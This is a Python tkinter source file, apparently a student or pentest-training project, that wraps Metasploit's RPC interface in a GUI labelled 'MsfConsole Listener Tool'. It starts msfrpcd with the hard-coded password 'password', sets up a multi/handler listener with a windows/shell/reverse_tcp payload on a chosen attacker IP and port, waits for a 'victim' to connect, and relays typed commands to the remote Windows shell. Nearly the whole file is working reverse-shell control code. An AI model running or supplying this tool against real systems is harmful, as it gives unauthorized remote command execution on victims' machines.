#Import all required modules.
from tkinter import *
import tkinter.messagebox
import tkinter as tk  # python 3
from tkinter import font  as tkfont  # python 3

from tkinter import font as tkfont
from tkinter import font, messagebox
import PySimpleGUI as sg
from nav_bar import *

import os
import socket
import time
import atexit
from subprocess import check_output
from pymetasploit3.msfrpc import MsfRpcClient

localhost_IP = ''
detected_IP = ''
selected_port = ''

class MsfListener(tk.Frame):
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        abtframefont = tkfont.Font(family='Calibri', size=33, weight="bold")
        display_nav_bar(self, controller)
        aboutframe = tk.Label(self, text="    MsfConsole Listener Tool", bg='#3B5262', fg='white', anchor="c", font=abtframefont)
        aboutframe.place(rely=0.08, relheight=0.12, relwidth=1)

        allscreenframe = tk.Label(self, bg='white')
        allscreenframe.place(rely=0.2, relheight=1, relwidth=1)

        labelIP = Label(self,text ="Enter Attacker IP Address: ", bg='#4D6C84', fg='white', font=('Calibri', 13), anchor='c')
        entryIP = Entry(self, font=('Calibri', 14))

        labelPort = Label(self,text ="Enter Port Number: ", bg='#4D6C84', fg='white', font=('Calibri', 13), anchor='c')
        entryPort = Entry(self, font=('Calibri', 14))

        labelIPRetrieve = Label(self, font=('Calibri', 14), bg='#4D6C84', fg='white', anchor='c')
        yesButtonIP = Button(self, text="YES",font=('Calibri', 14), bg='#4D6C84', fg='white', anchor='c', command= lambda: ip_retrieved())
        noButtonIP = Button(self, text="NO",font=('Calibri', 14), bg='#4D6C84', fg='white', anchor='c', command= lambda: ip_manual())
        proceedButtonIP = Button(self, text="PROCEED",font=('Calibri', 14), bg='#4D6C84', fg='white',anchor='c', command= lambda: [remove_ip_entry_boxes(), set_port()])

        labelPortRetrieve = Label(self, text= "Set default port (4444) for connection?", font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c')
        yesButtonPort = Button(self, text="YES",font=('Calibri', 14), bg='#4D6C84', fg='white', anchor='c', command= lambda: port_default())
        noButtonPort = Button(self, text="NO",font=('Calibri', 14), bg='#4D6C84', fg='white', anchor='c', command= lambda: port_manual())
        proceedButtonPort = Button(self, text="PROCEED",font=('Calibri', 14), bg='#4D6C84', fg='white', anchor='c', command= lambda: [remove_port_entry_boxes(), start_listener()])

        cmdResponse = Text(self, font=('Calibri', 12))
        cmdEntryLabel = Label(self, text= "Enter Command (type exit to stop):", bg='#4D6C84', fg='white', font=('Calibri', 13), anchor='c')
        cmdEntryBox = Entry(self, font=('Calibri', 14))
        cmdButton = Button(self, text="Enter",font=('Calibri', 14), bg='#4D6C84', fg='white', anchor='c', command= lambda: command_transmission())

        waitExeLabel = Label(self, text= "Listener Configuration Successful!\n(Program will await connection from\nvictim after clicking 'Start Listening' button)", bg='#4D6C84', fg='white', font=('Calibri', 13), anchor='c')
        conSuccessLabel = Label(self, text= "Connection Successful!", bg='#4D6C84', fg='white', font=('Calibri', 13), anchor='c')

        endButton = Button(self, text="Terminate",font=('Calibri', 14), bg='#4D6C84', fg='white', anchor='c', command= lambda: [kill_PID(), remove_response_boxes()])

        beginButton = Button(self,text="Launch Tool",font=('Calibri', 18, 'bold'), bg='#4D6C84', fg='white',anchor='c', command= lambda: set_IP())
        beginButton.place(rely=0.54, relx=0.44, relheight=0.08, relwidth=0.12)

        listenButton = Button(self,text="Start Listening",font=('Calibri', 14), bg='#4D6C84', fg='white', anchor='c', command= lambda: session_interact())
        shellButton = Button(self,text="Shell",font=('Calibri', 14), bg='#4D6C84', fg='white', anchor='c', command= lambda: shell())

        atexit.register(lambda:kill_PID())

        def ip_entry_boxes():
            labelIP.place(rely=0.54, relx=0.18, relheight=0.08, relwidth=0.24)
            entryIP.place(rely=0.54, relx=0.44, relheight=0.08, relwidth=0.24)

        def port_entry_boxes():
            labelPort.place(rely=0.54, relx=0.18, relheight=0.08, relwidth=0.24)
            entryPort.place(rely=0.54, relx=0.44, relheight=0.08, relwidth=0.24)

        def remove_ip_entry_boxes():
            labelIP.place_forget()
            entryIP.place_forget()

        def remove_port_entry_boxes():
            labelPort.place_forget()
            entryPort.place_forget()

        def remove_response_boxes():
            cmdResponse.place_forget()
            cmdEntryBox.place_forget()
            cmdEntryLabel.place_forget()
            cmdButton.place_forget()
            endButton.place_forget()
            beginButton.place(rely=0.54, relx=0.44, relheight=0.08, relwidth=0.12)

        #Retrieves PID and kills 'msfrpcd' process on Kali.
        def kill_PID():
            try:
                pid = int(check_output(['pidof', 'msfrpcd']))
                os.system('kill ' + str(pid))
            except:
                print("EXCEPTION: No running process of MsfRPC found.")

        #Function to set IPv4 address of local machine.
        def set_IP():
            global localhost_IP
            global detected_IP

            beginButton.place_forget()

            #Uses google DNS server to check IP.
            try:
                p = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                p.connect(('8.8.8.8', 1))
                detected_IP = p.getsockname()[0]
                p.close()
            except:
                detected_IP = '#IP UNRETRIEVABLE#' #Try-except block prevents crash if IP cannot be retrieved.

            labelIPRetrieve.config(text= "Is this the correct IP address: " + detected_IP)
            labelIPRetrieve.place(rely=0.54, relx=0.24, relheight=0.08, relwidth=0.24)
            yesButtonIP.place(rely=0.54, relx=0.5, relheight=0.08, relwidth=0.12)
            noButtonIP.place(rely=0.54, relx=0.64, relheight=0.08, relwidth=0.12)

        def ip_retrieved():
            global localhost_IP
            global detected_IP

            labelIPRetrieve.place_forget()
            yesButtonIP.place_forget()
            noButtonIP.place_forget()
            localhost_IP = detected_IP
            set_port()

        def ip_manual():
            global localhost_IP

            labelIPRetrieve.place_forget()
            yesButtonIP.place_forget()
            noButtonIP.place_forget()
            ip_entry_boxes()
            proceedButtonIP.place(rely=0.54, relx=0.7, relheight=0.08, relwidth=0.12)

        #Function to set correct port for attack.
        def set_port():
            try:
                proceedButtonIP.place_forget()
            finally:      
                labelPortRetrieve.place(rely=0.54, relx=0.24, relheight=0.08, relwidth=0.24)
                yesButtonPort.place(rely=0.54, relx=0.5, relheight=0.08, relwidth=0.12)
                noButtonPort.place(rely=0.54, relx=0.64, relheight=0.08, relwidth=0.12)

        def port_default():
            global selected_port

            labelPortRetrieve.place_forget()
            yesButtonPort.place_forget()
            noButtonPort.place_forget()
            selected_port = '4444'
            start_listener()

        def port_manual():
            global selected_port

            labelPortRetrieve.place_forget()
            yesButtonPort.place_forget()
            noButtonPort.place_forget()
            port_entry_boxes()
            proceedButtonPort.place(rely=0.54, relx=0.7, relheight=0.08, relwidth=0.12)

        #Retrieves running session from Msfconsole.
        def find_session(sessions_list, exploit_job):
            if not(sessions_list):
                return False
            for i in sessions_list:
                if(sessions_list[i]['exploit_uuid'] == exploit_job['uuid']):
                    return i

        #Function for communicating with shell. While loop to prompt user to enter commands. Terminates when user types 'exit'.
        def command_transmission():
            terminalInput = cmdEntryBox.get()
            output = client.sessions.session(sessionActive).run_with_output(cmd=terminalInput, end_strs='\bC:')
            try:
                cmdResponse.delete('1.0', END)
            finally:
                cmdResponse.insert(END, output)
                cmdResponse.place(rely=0.22, relx=0.56, relheight=0.76, relwidth=0.42)

        def command_transmission_tkinter():
                try:
                    cmdResponse.place_forget()
                    cmdEntryLabel.place_forget()
                    cmdEntryBox.place_forget()
                    cmdResponse.place_forget()
                    cmdResponse.delete('1.0', END)
                    cmdButton.place_forget()
                finally:
                    cmdEntryLabel.place(rely=0.46, relx=0.04, relheight=0.08, relwidth=0.24)
                    cmdEntryBox.place(rely=0.46, relx=0.30, relheight=0.08, relwidth=0.24)
                    cmdButton.place(rely=0.56, relx=0.46, relheight=0.08, relwidth=0.08)
                    endButton.place(rely=0.56, relx=0.30, relheight=0.08, relwidth=0.08)
                    cmdResponse.place(rely=0.22, relx=0.56, relheight=0.76, relwidth=0.42)

        def start_listener():
            global localhost_IP
            global selected_port

            global client
            global exploitRun

            try:
                proceedButtonPort.place_forget()
            finally:
                if(localhost_IP == ''):
                    localhost_IP = entryIP.get()
                if(selected_port == ''):
                    selected_port = entryPort.get()

                #Starts msfrpc process.
                msfrpcStart = 'msfrpcd -P password -S'
                os.system(msfrpcStart)

                time.sleep(5)

                client = MsfRpcClient('password', port=55553, ssl=False)

                lhost = localhost_IP
                lport = selected_port

                #Specifies attack options.
                exploit = client.modules.use('exploit', 'multi/handler')
                payload = client.modules.use('payload', 'windows/shell/reverse_tcp')
                payload['LHOST'] = lhost
                payload['LPORT'] = lport

                #Runs exploit.
                exploitRun = exploit.execute(payload=payload)

                localhost_IP = ''
                selected_port = ''
                lhost = ''
                lport = ''

                waitExeLabel.place(rely=0.46, relx=0.34, relheight=0.08, relwidth=0.32)
                listenButton.place(rely=0.56, relx=0.44, relheight=0.08, relwidth=0.12)

        def session_interact():
            listenButton.place_forget()
            waitExeLabel.place_forget()

            #Checks session list is empty before progressing further through source code.
            while(len(client.sessions.list) == 0):
                time.sleep(0.1)

            waitExeLabel.place_forget()
            conSuccessLabel.place(rely=0.46, relx=0.38, relheight=0.08, relwidth=0.24)
            shellButton.place(rely=0.56, relx=0.44, relheight=0.08, relwidth=0.12)

        def shell():
            global sessionActive

            conSuccessLabel.place_forget()
            shellButton.place_forget()

            #Gets session for the exploit.
            sessionActive = find_session(client.sessions.list, exploitRun)

            command_transmission_tkinter()


#REFERENCES:

#https://github.com/DanMcInerney/pymetasploit3
    #Repository where 'pymetasploit3.msfrpc' module is imported from.
    #Used as guide for communication with MSFRPC framework.

#https://stackoverflow.com/questions/26688936/how-to-get-pid-by-process-name
    #Used to help define 'kill_PID()' function.

#https://infosecaddicts.com/python-and-metasploit/
    #Used to help define 'find_session()' function.

#https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
    #Used to help define 'set_IP()' function.